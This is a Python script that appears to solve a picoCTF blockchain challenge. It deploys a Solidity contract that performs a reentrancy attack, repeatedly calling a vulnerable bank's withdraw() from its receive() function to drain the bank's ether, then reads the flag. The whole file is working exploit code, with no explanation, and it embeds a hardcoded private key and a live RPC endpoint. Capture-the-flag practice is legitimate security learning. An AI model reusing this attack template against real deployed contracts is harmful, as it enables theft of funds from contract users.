from web3 import Web3
from solcx import compile_source, install_solc

RPC = "http://crystal-peak.picoctf.net:49599"
PRIVATE_KEY = "0x4aff1631f8e8a6635444dc2cfddaa7dd67aa37040cf52367fd87b879bbdd727c"

BANK_ADDRESS = "0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF"

w3 = Web3(Web3.HTTPProvider(RPC))

print("Connected:", w3.is_connected())

acct = w3.eth.account.from_key(PRIVATE_KEY)
nonce = w3.eth.get_transaction_count(acct.address)

print("Attacker address:", acct.address)

install_solc("0.6.12")

source = """
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Attacker {

    IVulnBank public bank;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    receive() external payable {
        if(address(bank).balance >= 1 ether){
            bank.withdraw(1 ether);
        }
    }
}
"""

compiled = compile_source(source, solc_version="0.6.12")
contract_interface = compiled['<stdin>:Attacker']

bytecode = contract_interface['bin']
abi = contract_interface['abi']

print("Bytecode length:", len(bytecode))

Attacker = w3.eth.contract(abi=abi, bytecode=bytecode)

print("Deploying attacker contract...")

tx = Attacker.constructor(BANK_ADDRESS).build_transaction({
    "from": acct.address,
    "nonce": nonce,
    "gas": 3000000,
    "gasPrice": w3.to_wei("10", "gwei")
})

signed = acct.sign_transaction(tx)

tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)

receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

attacker_address = receipt.contractAddress

print("Attacker deployed:", attacker_address)

nonce += 1

attacker = w3.eth.contract(address=attacker_address, abi=abi)

print("Launching reentrancy attack...")

tx = attacker.functions.attack().build_transaction({
    "from": acct.address,
    "value": w3.to_wei(1, "ether"),
    "nonce": nonce,
    "gas": 3000000,
    "gasPrice": w3.to_wei("10", "gwei")
})

signed = acct.sign_transaction(tx)

tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)

w3.eth.wait_for_transaction_receipt(tx_hash)

print("Attack sent!")

print("Bank balance:", w3.from_wei(w3.eth.get_balance(BANK_ADDRESS), "ether"), "ETH")

bank_abi = [{
    "inputs": [],
    "name": "getFlag",
    "outputs": [{"internalType": "string","name":"","type":"string"}],
    "stateMutability": "view",
    "type": "function"
}]

bank = w3.eth.contract(address=BANK_ADDRESS, abi=bank_abi)

try:
    flag = bank.functions.getFlag().call()
    print("FLAG:", flag)
except:
    print("Flag belum terbuka, jalankan attack lagi.")